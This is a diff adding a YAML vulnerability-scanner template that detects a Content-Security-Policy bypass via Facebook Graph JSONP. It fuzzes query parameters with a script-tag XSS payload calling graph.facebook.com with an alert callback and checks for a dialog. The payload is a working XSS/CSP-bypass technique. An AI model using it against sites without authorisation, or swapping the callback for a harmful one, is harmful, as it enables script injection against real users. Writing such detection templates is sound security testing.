@@ -1,0 +1,55 @@
+id: facebook-graph-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Facebook Graph
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,facebook-graph
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "facebook.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: facebook_graph_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "facebook_graph_csp_xss == true"
+# digest: 490a004630440220486ee544e1f5c8c496903f0695acaca0ad0fdd182bc5503c97fff963e4a83546022010aa35bd6a83b9ba34f02dc19f79843fa8e68872eada97d5c0534ce338eba64a:922c64590222798bb761d5b6d8e72950
